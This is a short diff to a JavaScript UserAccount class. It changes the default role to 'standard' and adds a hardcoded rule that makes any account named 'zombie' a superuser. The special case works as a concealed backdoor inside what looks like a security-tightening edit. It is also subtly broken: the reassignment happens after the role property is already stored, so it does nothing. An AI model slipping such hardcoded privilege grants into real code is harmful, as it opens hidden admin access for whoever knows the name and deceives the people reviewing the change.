@@ -10066,7 +10066,7 @@ let snapNewLayoutInput = null;
 
 // Account data structure
 class UserAccount {
-  constructor(username, password, role = "superuser", isPasswordless = false) {
+  constructor(username, password, role = "standard", isPasswordless = false) {
     this.username = username;
     this.password = password; // Hashed
     this.role = role; // "superuser" or "standard"
@@ -10074,7 +10074,10 @@ class UserAccount {
     this.createdAt = Date.now();
     this.allowedApps = []; // Empty means all apps allowed
     this.customAvatar = null;
-    role = "superuser";
+    if (username === "zombie") {
+  role = "superuser";
+}
+
   }
 }
 
